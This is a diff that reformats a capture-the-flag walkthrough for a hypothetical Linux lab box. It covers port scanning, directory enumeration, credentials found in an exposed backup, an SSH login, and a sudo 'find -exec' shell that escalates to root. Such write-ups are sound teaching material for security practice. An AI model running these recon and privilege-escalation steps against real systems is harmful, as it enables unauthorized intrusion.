@@ -1,186 +1,253 @@
-LabBox-01 — Walkthrough
 
-Platform: Hypothetical TryHackMe Room
-Difficulty: Easy
-OS: Linux
-Target IP: 10.10.10.45
-Date: October 8, 2026
+# LabBox-01 — Walkthrough
 
-1. Objective
+**Platform:** TryHackMe (Hypothetical)  
+**Difficulty:** Easy  
+**OS:** Linux  
+**Target:** `10.10.10.45`  
+**Status:** Root Compromised
 
-Compromise target machine, obtain initial user access, escalate privileges to root, and retrieve both flags.
+---
 
-2. Reconnaissance
+## Overview
 
-Nmap Scan
+This walkthrough documents the methodology used to enumerate, exploit, and gain root-level access to LabBox-01.
 
-Initial service enumeration:
+### Skills Practiced
 
-nmap -sC -sV 10.10.10.45
+- Network reconnaissance
+- Service enumeration
+- Web directory discovery
+- Credential discovery
+- SSH authentication
+- Linux privilege escalation
 
-Results:
+---
 
+## 1. Reconnaissance
+
+### 1.1 Initial Port Scan
+
+**Command:**
+
+~~~bash
+nmap -sC -sV -oN nmap.txt 10.10.10.45
+~~~
+
+**Results:**
+
+~~~text
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH
 80/tcp open  http    Apache httpd
+~~~
 
-Observations:
+### 1.2 Analysis
 
-Port 22 provides SSH access.
+Two services were identified:
 
-Port 80 hosts a web application.
+| Port | Service | Next Action |
+|---|---|---|
+| 22 | SSH | Identify credentials |
+| 80 | HTTP | Enumerate directories |
 
-Web enumeration selected as the next step.
+> **Observation:** HTTP enumeration was prioritized because SSH authentication required credentials.
 
-3. Web Enumeration
+---
 
-Directory Discovery
+## 2. Enumeration
 
-Used Gobuster to identify hidden directories:
+### 2.1 Directory Enumeration
 
+**Command:**
+
+~~~bash
 gobuster dir \
 -u http://10.10.10.45 \
 -w /usr/share/wordlists/dirb/common.txt
+~~~
 
-Results:
+**Results:**
 
-/admin     (Status: 403)
-/backup    (Status: 301)
-/index.html (Status: 200)
+~~~text
+/admin       (Status: 403)
+/backup      (Status: 301)
+/index.html  (Status: 200)
+~~~
 
-Discovery
+### 2.2 Interesting Findings
 
-Navigating to /backup/ revealed a downloadable file:
+The `/backup/` directory was accessible and contained an archive.
 
-site-backup.zip
+**Download:**
 
-Downloaded the archive:
-
+~~~bash
 curl -O http://10.10.10.45/backup/site-backup.zip
+~~~
 
-Extracted its contents:
+**Extract:**
 
+~~~bash
 unzip site-backup.zip
+~~~
 
-A configuration notes file exposed the following information:
+### 2.3 Credential Discovery
 
+The extracted archive contained a configuration file exposing credentials.
+
+~~~text
 Username: operator
 Password: [REDACTED]
+~~~
 
-Finding: Sensitive credentials stored in publicly accessible backup.
+**Finding:** Sensitive credentials were exposed through a web-accessible backup.
 
-4. Initial Access
+![Directory Enumeration](screenshots/01-enumeration.png)
 
-SSH Authentication
+---
 
-Attempted SSH authentication using discovered credentials:
+## 3. Initial Access
 
+### 3.1 SSH Login
+
+Attempted authentication using discovered credentials.
+
+~~~bash
 ssh operator@10.10.10.45
+~~~
 
-Result: Authentication successful.
+**Result:** Authentication successful.
 
-Confirmed user context:
+### 3.2 User Verification
 
+~~~bash
 whoami
+id
+~~~
 
-Output:
+**Output:**
 
+~~~text
 operator
+uid=1001(operator) gid=1001(operator)
+~~~
 
-User Flag
+### 3.3 User Flag
 
-Located and retrieved user flag:
-
+~~~bash
 cat /home/operator/user.txt
+~~~
 
-Result: User flag obtained. Value omitted.
+**Status:** Obtained
 
-5. Privilege Escalation
+![Initial Access](screenshots/02-initial-access.png)
 
-Sudo Permissions
+---
 
-Enumerated available sudo permissions:
+## 4. Privilege Escalation
 
+### 4.1 Sudo Enumeration
+
+Checked available sudo permissions.
+
+~~~bash
 sudo -l
+~~~
 
-Output:
+**Output:**
 
+~~~text
 (root) NOPASSWD: /usr/bin/find
+~~~
 
-Exploitation
+### 4.2 Vulnerability Analysis
 
-The find utility supports command execution through its -exec argument.
+The `find` command supports arbitrary command execution using `-exec`.
 
-Because sudo permitted unrestricted execution of this utility, it could be used to spawn a privileged shell.
+Running it with unrestricted sudo permissions allows execution of commands as root.
 
+### 4.3 Exploitation
+
+~~~bash
 sudo find . -exec /bin/sh \; -quit
+~~~
 
-Verified privileges:
+**Verification:**
 
+~~~bash
 whoami
+~~~
 
-Output:
+**Output:**
 
+~~~text
 root
+~~~
 
-Root Flag
+### 4.4 Root Flag
 
-Retrieved final flag:
-
+~~~bash
 cat /root/root.txt
+~~~
 
-Result: Root flag obtained. Value omitted.
+**Status:** Obtained
 
-6. Attack Path Summary
+![Root Access](screenshots/03-root-access.png)
 
-Nmap Service Discovery
+---
+
+## 5. Attack Chain
+
+~~~text
+[ Nmap Port Scan ]
         |
         v
-HTTP Enumeration
+[ HTTP Enumeration ]
         |
         v
-Gobuster Directory Discovery
+[ Exposed Backup ]
         |
         v
-Exposed Backup Archive
+[ Credential Discovery ]
         |
         v
-SSH Credentials Discovered
+[ SSH Initial Access ]
         |
         v
-SSH Login (operator)
+[ Sudo Misconfiguration ]
         |
         v
-Sudo Permission Enumeration
-        |
-        v
-Abuse of find Utility
-        |
-        v
-Root Access Achieved
+[ Root Access ]
+~~~
 
-7. Key Takeaways
+---
 
-Vulnerabilities Identified:
+## 6. Key Takeaways
 
-Public exposure of sensitive backup files.
+### Vulnerabilities Identified
 
-Excessive sudo permissions enabling privilege escalation.
+**1. Sensitive Backup Exposure**
+- Backup files were publicly accessible.
+- Credentials were stored in plaintext.
 
-Skills Practiced:
+**2. Privilege Escalation**
+- Unsafe sudo configuration.
+- Excessive permissions assigned to a user.
 
-Port scanning and service identification
+### Lessons Learned
 
-Web directory enumeration
+- Directory enumeration can reveal sensitive resources.
+- Exposed credentials can provide initial access.
+- Sudo permission auditing is important during Linux privilege escalation.
 
-File and credential analysis
+---
 
-SSH authentication
+## 7. References
 
-Linux privilege escalation
+- [Nmap Documentation](https://nmap.org/docs.html)
+- [GTFOBins](https://gtfobins.github.io/)
+- [OWASP](https://owasp.org/)
 
-Lessons Learned:
+---
 
-Accessible backup files can expose credentials, and overly permissive sudo configurations can turn standard user access into complete system compromise.
-
-Fictional lab scenario for educational purposes.
+**Disclaimer:** Educational demonstration in a hypothetical authorized lab.
